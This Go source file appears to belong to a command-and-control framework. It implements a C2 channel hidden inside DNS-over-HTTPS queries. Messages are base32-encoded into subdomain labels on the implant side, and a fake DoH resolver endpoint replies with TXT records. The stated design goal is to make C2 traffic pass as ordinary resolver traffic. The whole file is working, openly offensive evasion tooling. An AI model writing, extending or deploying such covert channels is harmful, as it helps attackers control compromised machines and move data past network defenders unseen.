package channels

import (
	"context"
	"encoding/base32"
	"encoding/json"
	"fmt"
	"net/http"
	"strings"
	"time"
)

// DOHChannel carries C2 traffic inside DNS-over-HTTPS JSON API queries.
// The whole message frame is base32-encoded into a single subdomain label,
// the DNS TXT record reply carries the base-32 response. Traffic looks like
// ordinary resolver traffic to a public DoH endpoint.
type DOHChannel struct {
	config *Config
	server *http.Server
}

type dohQuestion struct {
	Name string `json:"name"`
	Type int    `json:"type"`
}

type dohAnswer struct {
	Name string `json:"name"`
	Type int    `json:"type"`
	TTL  int    `json:"TTL"`
	Data string `json:"data"`
}

type dohResponse struct {
	Status int         `json:"Status"`
	Answer []dohAnswer `json:"Answer"`
}

func newDOHChannel(config *Config) (*DOHChannel, error) {
	return &DOHChannel{config: config}, nil
}

func (d *DOHChannel) Type() ChannelType {
	return ChannelDoH
}

func (d *DOHChannel) Send(ctx context.Context, msg *Message) (*Message, error) {
	if d.config.DoHURL == "" {
		return nil, fmt.Errorf("doh: no resolution endpoint configured")
	}
	domain := d.config.DoHDomain
	if domain == "" {
		domain = d.config.DNSAddr
	}
	if domain == "" {
		domain = "voidsec.local"
	}

	payload := newMessageBuffer(msg)
	qname := strings.ToLower(strings.TrimRight(base32.StdEncoding.EncodeToString(payload), "="))
	fqdn := fmt.Sprintf("%s.%s", qname, domain)

	client := &http.Client{Timeout: time.Duration(d.config.TimeoutSec) * time.Second}
	for attempt := 0; attempt <= d.config.MaxRetries; attempt++ {
		url := fmt.Sprintf("%s?name=%s&type=TXT", d.config.DoHURL, fqdn)
		req, err := http.NewRequestWithContext(ctx, "GET", url, nil)
		if err != nil {
			return nil, fmt.Errorf("doh: build request: %w", err)
		}
		req.Header.Set("Accept", "application/dns-json")
		req.Header.Set("User-Agent", d.config.UserAgent)

		resp, err := client.Do(req)
		if err != nil {
			if attempt < d.config.MaxRetries {
				time.Sleep(getJitter(1, 3))
				continue
			}
			return nil, fmt.Errorf("doh: query: %w", err)
		}

		var parsed dohResponse
		decErr := json.NewDecoder(resp.Body).Decode(&parsed)
		resp.Body.Close()
		if decErr != nil {
			return nil, fmt.Errorf("doh: decode: %w", decErr)
		}

		if len(parsed.Answer) == 0 {
			if attempt < d.config.MaxRetries {
				time.Sleep(getJitter(1, 3))
				continue
			}
			return nil, fmt.Errorf("doh: empty answer set")
		}

		decoded, err := base32.StdEncoding.DecodeString(strings.ToUpper(strings.TrimSpace(parsed.Answer[0].Data)))
		if err != nil {
			return nil, fmt.Errorf("doh: decode answer: %w", err)
		}
		return parseMessageBuffer(decoded)
	}

	return nil, fmt.Errorf("doh: message send failed")
}

func (d *DOHChannel) Listen(ctx context.Context, addr string, handler func(*Message) *Message) error {
	mux := http.NewServeMux()

	mux.HandleFunc("/dns-query", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodGet {
			http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
			return
		}
		qname := r.URL.Query().Get("name")
		if qname == "" {
			http.Error(w, "empty name", http.StatusBadRequest)
			return
		}
		parts := strings.Split(qname, ".")
		if len(parts) < 2 {
			http.Error(w, "bad name", http.StatusBadRequest)
			return
		}
		padded := strings.ToUpper(parts[0]) + strings.Repeat("=", (8-len(parts[0])%8)%8)
		payload, err := base32.StdEncoding.DecodeString(padded)
		if err != nil {
			http.Error(w, "base32 decode", http.StatusBadRequest)
			return
		}
		msg, err := parseMessageBuffer(payload)
		if err != nil {
			http.Error(w, "parse message", http.StatusBadRequest)
			return
		}

		resp := handler(msg)
		if resp == nil {
			http.Error(w, "no response", http.StatusInternalServerError)
			return
		}
		data := strings.ToLower(strings.TrimRight(base32.StdEncoding.EncodeToString(newMessageBuffer(resp)), "="))
		w.Header().Set("Content-Type", "application/dns-json")
		w.WriteHeader(http.StatusOK)
		json.NewEncoder(w).Encode(dohResponse{
			Status: 0,
			Answer: []dohAnswer{{
				Name: qname,
				Type: 16,
				TTL:  60,
				Data: data,
			}},
		})
	})

	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusNotFound)
		w.Write([]byte("404 page not found\n"))
	})

	d.server = &http.Server{
		Addr:    addr,
		Handler: mux,
	}

	_ = ctx
	return d.server.ListenAndServe()
}

func (d *DOHChannel) ListenWithTLS(ctx context.Context, addr string, certFile, keyFile string, handler func(*Message) *Message) error {
	mux := http.NewServeMux()

	mux.HandleFunc("/dns-query", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodGet {
			http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
			return
		}
		qname := r.URL.Query().Get("name")
		if qname == "" {
			http.Error(w, "empty name", http.StatusBadRequest)
			return
		}
		parts := strings.Split(qname, ".")
		if len(parts) < 2 {
			http.Error(w, "bad name", http.StatusBadRequest)
			return
		}
		padded := strings.ToUpper(parts[0]) + strings.Repeat("=", (8-len(parts[0])%8)%8)
		payload, err := base32.StdEncoding.DecodeString(padded)
		if err != nil {
			http.Error(w, "base32 decode", http.StatusBadRequest)
			return
		}
		msg, err := parseMessageBuffer(payload)
		if err != nil {
			http.Error(w, "parse message", http.StatusBadRequest)
			return
		}

		resp := handler(msg)
		if resp == nil {
			http.Error(w, "no response", http.StatusInternalServerError)
			return
		}
		data := strings.ToLower(strings.TrimRight(base32.StdEncoding.EncodeToString(newMessageBuffer(resp)), "="))
		w.Header().Set("Content-Type", "application/dns-json")
		w.WriteHeader(http.StatusOK)
		json.NewEncoder(w).Encode(dohResponse{
			Status: 0,
			Answer: []dohAnswer{{
				Name: qname,
				Type: 16,
				TTL:  60,
				Data: data,
			}},
		})
	})

	d.server = &http.Server{
		Addr:    addr,
		Handler: mux,
	}

	_ = ctx
	return d.server.ListenAndServeTLS(certFile, keyFile)
}

func (d *DOHChannel) Close() error {
	if d.server != nil {
		return d.server.Close()
	}
	return nil
}